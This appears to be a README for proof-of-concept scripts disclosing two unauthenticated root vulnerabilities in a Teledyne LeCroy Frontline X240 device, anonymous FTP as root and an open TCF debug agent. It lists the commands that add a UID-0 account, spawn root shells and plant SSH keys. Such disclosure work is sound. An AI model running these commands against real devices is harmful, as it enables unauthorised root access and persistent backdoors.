# Proof of concept scripts

Two independent vulnerabilities, each giving unauthenticated root on the Ethernet host-communication interface of a Teledyne LeCroy Frontline X240 (factory default `10.10.0.240`). See the top-level `writeup.md` for analysis.

Authorized testing only. Run these against equipment you own or are explicitly permitted to test. See `../DISCLAIMER.md`.

## Read-only exposure checker

| Script | Purpose |
|--------|---------|
| `x240_check.py` | Check anonymous FTP root metadata and the unsolicited TCF service list without retrieving file contents or sending TCF commands. |

```
python x240_check.py 10.10.0.240
python x240_check.py 10.10.0.240 --json
```

## Finding 1: Anonymous FTP as root (TCP/21)

| Script | Purpose |
|--------|---------|
| `x240_ftp_shell.py`   | Interactive FTP browser: list, read, hex-dump, and writability-test the anonymous surface. |
| `x240_ftp_mirror.py`  | Mirror the whole root filesystem read-only, with a metadata + SHA-256 manifest. |
| `x240_ftp_adduser.py` | Append a parallel UID-0 account to `/etc/passwd` + `/etc/shadow`, then log in over SSH/telnet. |

```
python x240_ftp_shell.py 10.10.0.240
python x240_ftp_adduser.py --dry-run                 # preview only
python x240_ftp_adduser.py                           # random password, prompts before write
python x240_ftp_adduser.py --restore x240_etc_backup_YYYYMMDD_HHMMSS_HEX
ssh support@10.10.0.240 -oHostKeyAlgorithms=+ssh-rsa
```

The account tool stores its local backups in a mode-0700 directory, verifies both uploaded files byte-for-byte, and attempts to restore both originals, including one retry on a fresh FTP connection, if any part of the update fails.

## Finding 2: Unauthenticated Xilinx TCF debug agent (TCP/1534)

| Script | Purpose |
|--------|---------|
| `x240_tcf_enum.py`     | Read-only enumeration: advertised services, agent ID, processes, filesystem roots, memory maps. |
| `x240_tcf_shell.py`    | Interactive root shell over TCF: spawns `/bin/sh` and drives its stdio through the Streams service. Persistent shell, entirely over TCP/1534, no FTP or SSH. |
| `x240_tcf_rce.py`      | One-shot: spawn `/bin/sh` as root via `ProcessesV1.start` and write a marker file. |
| `x240_tcf_keyplant.py` | Safely append an SSH public key while preserving existing keys and recording cleanup state (generates a keypair if none supplied). |

```
python x240_tcf_enum.py 10.10.0.240
python x240_tcf_shell.py 10.10.0.240
python x240_tcf_rce.py 10.10.0.240
python x240_tcf_keyplant.py 10.10.0.240
python x240_tcf_keyplant.py --cleanup x240_tcf_keyplant_YYYYMMDD_HHMMSS.json
ssh support@10.10.0.240 -oHostKeyAlgorithms=+ssh-rsa 'cat /tmp/x240_tcf_poc_*.txt'
```

The key-planting tool confirms before changing the target, preserves existing keys, creates a remote recovery backup when needed, and writes a local state file. `--cleanup` removes only the key it added; `--restore-backup` is an emergency option that restores the complete pre-change file and may overwrite later legitimate changes.
